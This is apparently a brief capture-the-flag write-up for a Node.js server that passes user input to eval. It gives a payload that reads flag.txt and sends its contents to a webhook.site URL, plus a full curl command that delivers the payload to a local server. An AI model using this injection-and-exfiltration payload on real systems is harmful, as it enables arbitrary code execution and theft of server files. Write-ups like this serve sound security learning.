Server calls eval on the data sent by user.
This can be exploited with for example following payload:

`fs=require('fs');a=fs.readFileSync('flag.txt');http=require('http');http.get("http://webhook.site/<your-id>/"+a.toString());`

Then you would get url encoded flag on your webhook.


`curl --location 'http://localhost:8000/' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'question=fs=require('\''fs'\'');a=fs.readFileSync('\''flag.txt'\'');http=require('\''http'\'');http.get("http://webhook.site/71a7dc1c-28cd-4b5b-8c3a-db6d8d41f880/"+a.toString());'`